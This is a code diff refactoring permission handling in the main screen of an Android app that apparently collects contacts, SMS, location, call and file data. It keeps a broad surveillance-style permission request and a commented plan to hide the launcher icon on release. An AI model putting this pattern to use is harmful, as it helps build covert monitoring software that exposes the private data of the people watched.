@@ -1,22 +1,17 @@
-package com.theah64.xrob;
+package com.theah64.xrob.activities;
 
 import android.Manifest;
-import android.content.ComponentName;
 import android.content.DialogInterface;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
-import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
 
-import com.theah64.xrob.asynctasks.ContactsSynchronizer;
-import com.theah64.xrob.services.ContactsWatcherService;
-import com.theah64.xrob.services.FileWalkerService;
+import com.theah64.xrob.R;
 import com.theah64.xrob.utils.APIRequestBuilder;
 import com.theah64.xrob.utils.APIRequestGateway;
 import com.theah64.xrob.utils.APIResponse;
@@ -33,10 +28,9 @@ import okhttp3.Callback;
 import okhttp3.Request;
 import okhttp3.Response;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends PermissionActivity {
 
     private static final String X = MainActivity.class.getSimpleName();
-    private static final int RQ_CODE_RQ_PERMISSIONS = 1;
     private static final String KEY_CLIENT_CODE = "client_code";
     private ProgressManager progressManager;
     private EditText etClientCode;
@@ -48,31 +42,6 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-
-            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{
-                        Manifest.permission.READ_CONTACTS,
-                        Manifest.permission.GET_ACCOUNTS,
-                        Manifest.permission.READ_PHONE_STATE,
-                        Manifest.permission.PROCESS_OUTGOING_CALLS,
-                        Manifest.permission.READ_EXTERNAL_STORAGE,
-                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                        Manifest.permission.ACCESS_COARSE_LOCATION,
-                        Manifest.permission.ACCESS_FINE_LOCATION,
-                        Manifest.permission.READ_SMS,
-                        Manifest.permission.RECEIVE_SMS,
-                        Manifest.permission.CALL_PHONE
-                }, RQ_CODE_RQ_PERMISSIONS);
-            } else {
-                doNormalWork();
-            }
-
-        } else {
-            doNormalWork();
-        }
-
     }
 
     @Override
@@ -171,18 +140,6 @@ public class MainActivity extends AppCompatActivity {
 
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        if (requestCode == RQ_CODE_RQ_PERMISSIONS) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                doNormalWork();
-            } else {
-                Toast.makeText(MainActivity.this, "You must accept the permissions.", Toast.LENGTH_SHORT).show();
-                finish();
-            }
-        }
-    }
-
-    @Override
     protected void onStop() {
 
        /* //TODO: Un comment on release . Hiding launcher icon
@@ -209,4 +166,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
+    @Override
+    public void onAllPermissionGranted() {
+
+        doNormalWork();
+
+
+    }
+
+    @Override
+    public void onPermissionDenial() {
+        Toast.makeText(MainActivity.this, "You must accept all the permissions.", Toast.LENGTH_SHORT).show();
+        finish();
+    }
 }
